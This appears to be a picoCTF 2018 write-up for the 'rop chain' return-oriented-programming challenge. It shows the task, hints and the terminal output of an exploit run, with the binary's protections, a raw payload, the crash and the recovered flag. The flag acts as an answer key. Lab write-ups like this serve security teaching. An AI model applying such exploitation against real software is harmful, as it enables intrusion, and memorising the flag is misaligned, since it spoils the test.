# rop chain - Points: 350 - (Solves: 170)

Can you exploit the following [program][1] and get the flag?
You can findi the program in
/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47
on the shell server?
[Source][2].

[1]: https://2018shell2.picoctf.com/static/51c2b076860b7628c8d751424e923504/rop
[2]: https://2018shell2.picoctf.com/static/51c2b076860b7628c8d751424e923504/rop.c

## Hints

- Try and call the functions in the correct order!
- Remember, you can always call main() again!

---

```sh
python xpwn.py
[*] '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop': pid 3207089
[*] ˅\x0؅\x0+\x86\x0\xad\xaa\xaa\xba\xad\xba\xad�
[*] Process '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop' stopped with exit code -11 (SIGSEGV) (pid 3207089)
picoCTF{rOp_aInT_5o_h4Rd_R1gHt_9853cfde}
```
